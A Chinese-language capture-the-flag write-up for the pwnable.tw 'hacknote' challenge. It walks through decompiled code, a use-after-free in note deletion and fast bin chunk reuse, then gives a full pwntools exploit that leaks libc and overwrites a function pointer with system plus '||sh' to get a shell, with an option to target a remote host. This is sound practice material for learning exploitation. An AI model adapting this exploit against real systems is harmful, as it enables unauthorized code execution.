# pwnable.tw——hacknote分析

这是一道比较经典的题目，所以稍微记录一下

## 1. 程序流程总览
首先，还是老规矩，看一下保护情况

```
[*] '/root/AutoExpMarkDocker-v3/data/pwnable_hacknote'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
```

可以看出来，PIE没有开启，可以修改got表，其余基本上都开启了，保护程度一般吧。下面我们来看一下程序的具体流程吧。

```c
void __noreturn main()
{
  int v0; // eax
  char buf[4]; // [esp+8h] [ebp-10h] BYREF
  unsigned int v2; // [esp+Ch] [ebp-Ch]

  v2 = __readgsdword(0x14u);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 2, 0);
  while ( 1 )
  {
    while ( 1 )
    {
      menu();
      read(0, buf, 4u);
      v0 = atoi(buf);
      if ( v0 != 2 )
        break;
      delete();
    }
    if ( v0 > 2 )
    {
      if ( v0 == 3 )
      {
        print();
      }
      else
      {
        if ( v0 == 4 )
          exit(0);
LABEL_13:
        puts("Invalid choice");
      }
    }
    else
    {
      if ( v0 != 1 )
        goto LABEL_13;
      add();
    }
  }
}
```

没什么好说的，还是比较经典的菜单题目。但是需要注意的是，对于note仅仅有 add 、 delete 和 print 功能，也就是没有修改功能，这个可能会对我们造成一定的影响

## 2. 漏洞
　
实际上，这个题目就是一道典型的堆问题。我们需要说先介绍一下对应的数据结构。

整体关系可以抽象成下面这样：

```text
ptr[i] (address)
        │
        ▼
  +-----------------------+
  |   func   |  address1  |   ← 控制 chunk（malloc(8)，真实 chunk 大小为 0x10）
  +-----------------------+
                  │
                  │ address1
                  ▼
             info chunk（存放用户输入的内容）
```

其中：

- `ptr[i]`：全局数组中的一个元素，内部保存的是某个 note 的「控制 chunk」地址（图中标为 `address`）。
- 控制 chunk：大小为 0x10，可用部分 0x8 字节，前 4 字节为函数指针 `func`，后 4 字节为指向真正内容区域的指针 `address1`。
- info chunk：真实的数据区，`address1` 指向这里，`print` 时会根据控制 chunk 中的函数指针和这个指针来决定如何输出内容。

实际上，正如如下的源代码所显示的一样

```c
unsigned int add()
{
  int v0; // ebx
  int i; // [esp+Ch] [ebp-1Ch]
  int size; // [esp+10h] [ebp-18h]
  char buf[8]; // [esp+14h] [ebp-14h] BYREF
  unsigned int v5; // [esp+1Ch] [ebp-Ch]

  v5 = __readgsdword(0x14u);
  if ( note_num <= 5 )
  {
    for ( i = 0; i <= 4; ++i )
    {
      if ( !*(&ptr + i) )
      {
        *(&ptr + i) = malloc(8u);
        if ( !*(&ptr + i) )
        {
          puts("Alloca Error");
          exit(-1);
        }
        *(_DWORD *)*(&ptr + i) = sub_804862B;
        printf("Note size :");
        read(0, buf, 8u);
        size = atoi(buf);
        v0 = (int)*(&ptr + i);
        *(_DWORD *)(v0 + 4) = malloc(size);
        if ( !*((_DWORD *)*(&ptr + i) + 1) )
        {
          puts("Alloca Error");
          exit(-1);
        }
        printf("Content :");
        read(0, *((void **)*(&ptr + i) + 1), size);
        puts("Success !");
        ++note_num;
        return __readgsdword(0x14u) ^ v5;
      }
    }
  }
  else
  {
    puts("Full");
  }
  return __readgsdword(0x14u) ^ v5;
}
```

首先请求一个控制chunk（实际大小为0x10），则其有0x8的可用空间，前4字节实际上是一个函数指针——后面会提到，后四个字节指向真正的输入内容部分，也就是info chunk。

而释放的时候则是首先释放info chunk，其次再释放控制chunk，代码如图所示

```c
unsigned int delete()
{
  int v1; // [esp+4h] [ebp-14h]
  char buf[4]; // [esp+8h] [ebp-10h] BYREF
  unsigned int v3; // [esp+Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  printf("Index :");
  read(0, buf, 4u);
  v1 = atoi(buf);
  if ( v1 < 0 || v1 >= note_num )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( *(&ptr + v1) )
  {
    free(*((void **)*(&ptr + v1) + 1));
    free(*(&ptr + v1));
    puts("Success");
  }
  return __readgsdword(0x14u) ^ v3;
}
```

而此处就有一个漏洞——UAF漏洞，即释放之后并没有清空指针，则仍然可以调用其他的相关函数。

继续介绍数据结构。

下面就是 print 函数的部分，代码如图所示，

```c
unsigned int print()
{
  int v1; // [esp+4h] [ebp-14h]
  char buf[4]; // [esp+8h] [ebp-10h] BYREF
  unsigned int v3; // [esp+Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  printf("Index :");
  read(0, buf, 4u);
  v1 = atoi(buf);
  if ( v1 < 0 || v1 >= note_num )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( *(&ptr + v1) )
    (*(void (__cdecl **)(_DWORD))*(&ptr + v1))(*(&ptr + v1));
  return __readgsdword(0x14u) ^ v3;
}

int __cdecl sub_804862B(int a1)
{
  return puts(*(const char **)(a1 + 4));
}
```


也就是，实际上调用了控制chunk可用部分的前4个字节的函数指针所指向的函数，参数为控制chunk可用部分地址。

那么，如果我们可以修改控制chunk中可用部分的前4个字节所指向的位置，修改为system，并在后四个字节中添加上 ||sh （这里一开始没想到，注意为了执行shell命令，可以的一些方法 sh# 或者 ||sh ，前一个可以注释掉后面的字符串，后一个如果前面不是有效命令的话可以执行shell），那么我们则可以成功获取到shell脚本。

## 3. 漏洞利用

这里我们介绍一下如何使用这个漏洞——实际上，用到了fast bin的分配原理，这里不详细介绍，直接说结论——释放掉fast bin的时候，会根据大小进行分类，并且每次请求的时候会按照后释放先分配的顺序在对应的类中重新进行分配。那么问题也就简单了，如果我们连续申请两个note（记住要让info chunk的大小大于0x10，否则就无法成功利用该漏洞），释放掉后再次申请一个note（此时要让info chunk的大小等于0x10），此时，根据之前所说的，此时的info chunk实际上就是前面的释放掉的note的其中一个控制chunk（因为他们大小相等），而我们可以向该note的info chunk，也就是前两个note之一的控制chunk输入，则成功达到我们的目的。之后我们就可以通过释放该note在重新申请同样大小的info chunk的note，来反复修改前两个note之一的控制chunk，从而完成漏洞利用，结构图如图所示

```text
0x10 大小的 fast bin
        ↓
note0 的控制 chunk ←→ note2 的 info chunk（第一次重叠）
        ↓
note1 的控制 chunk ←→ note2 的控制 chunk（第二次重叠）
```

也就是说，通过精心控制 0x10 大小 chunk 的分配 / 释放顺序，
- 先让 `note2` 的 info chunk 复用 `note0` 的控制 chunk 所在的内存，从而可以篡改 `note0` 的函数指针；
- 再让 `note2` 的控制 chunk 本身复用 `note1` 的控制 chunk 所在的内存，从而可以继续对另一个控制块进行修改。

最后放上完整的wp

```python
#coding:utf-8
from pwn import *
#context.log_level = 'debug'
debug = 1

def wp_add(size, content):
    r.recvuntil('Your choice :')
    r.send('1'.ljust(4, '\x00'))
    r.recvuntil('Note size :')
    r.send(str(size).ljust(8, '\x00'))
    r.recvuntil('Content :')
    r.send(content)

def wp_delete(index):
    r.recvuntil('Your choice :')
    r.send('2'.ljust(4, '\x00'))
    r.recvuntil('Index :')
    r.send(str(index).ljust(4, '\x00'))

def wp_print(index):
    r.recvuntil('Your choice :')
    r.send('3'.ljust(4, '\x00'))
 
    r.recvuntil('Index :')
    r.send(str(index).ljust(4, '\x00'))
    return r.recv(4)

def wp_exit():
    r.recvuntil('Your choice :')
    r.send('4'.ljust(4, '\x00'))

def exp(debug):
    global r
    if debug == 1:
        r = process('./hacknote')
        #gdb.attach(r, 'b *0x0804869A')
        lib = ELF('/lib/i386-linux-gnu/libc-2.23.so')
    else:
        r = remote('111.198.29.45', 41471)
        lib = ELF('./hacknote_lib')

    elf = ELF('./hacknote')
    print elf.got['puts']
    wp_add(0x20, 'a')   #index:0
    wp_add(0x20, 'a')   #index:1
    wp_delete(0)
    wp_delete(1)
    wp_add(0x8, p32(0x0804862B) + p32(elf.got['puts'])) #index:2
    lib_base = u32(wp_print(0)) - lib.sym['puts']
    log.info('lib_base => %#x'%lib_base)
    wp_delete(2)
    wp_add(0x8, p32(lib_base + lib.sym['system']) + '||sh')
    wp_print(0)
    r.interactive()
exp(debug)
```